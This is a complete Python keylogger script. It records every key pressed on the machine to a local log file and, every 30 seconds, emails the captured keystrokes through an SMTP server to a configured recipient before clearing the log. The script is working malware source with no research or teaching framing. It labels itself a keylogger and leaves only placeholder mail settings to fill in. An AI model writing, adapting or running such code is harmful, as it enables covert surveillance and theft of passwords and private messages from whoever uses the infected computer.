import keyboard  # pip install keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import os.path

# Email configuration
SMTP_SERVER = 'smtp.example.com'  # Update with your SMTP server address
SMTP_PORT = 587  # Update with your SMTP server port
SMTP_USERNAME = 'your_email@example.com'  # Update with your email address
SMTP_PASSWORD = 'your_email_password'  # Update with your email password
EMAIL_FROM = 'your_email@example.com'  # Update with your email address
EMAIL_TO = 'recipient@example.com'  # Update with recipient's email address

# Function to send email
def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_FROM
    msg['To'] = EMAIL_TO
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        server.sendmail(EMAIL_FROM, EMAIL_TO, msg.as_string())
        server.quit()
        print(f"Email sent successfully to {EMAIL_TO}")
    except Exception as e:
        print(f"Failed to send email: {str(e)}")

# Function to write keys to file
def write_to_file(keys):
    with open("keystrokes.log", "a") as f:
        for key in keys:
            f.write(str(key) + "\n")

# Function to handle key events
def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        write_to_file([event.name])

keyboard.on_press(on_key_event)

# Create keystrokes log file if it doesn't exist
if not os.path.exists("keystrokes.log"):
    open("keystrokes.log", "w").close()

# Keep the script running to capture keystrokes and send emails every 30 seconds
print("Keylogger started. Press 'Esc' to stop.")

while True:
    # Read keystrokes from file
    with open("keystrokes.log", "r") as f:
        keystrokes = f.read()

    # Send email every 30 seconds with captured keystrokes
    send_email("Keystrokes Log", keystrokes)

    # Clear keystrokes log file
    open("keystrokes.log", "w").close()

    # Wait for 30 seconds
    time.sleep(30)

    # Check if 'Esc' key is pressed to stop the keylogger
    if keyboard.is_pressed('esc'):
        break

print("Keylogger stopped.")
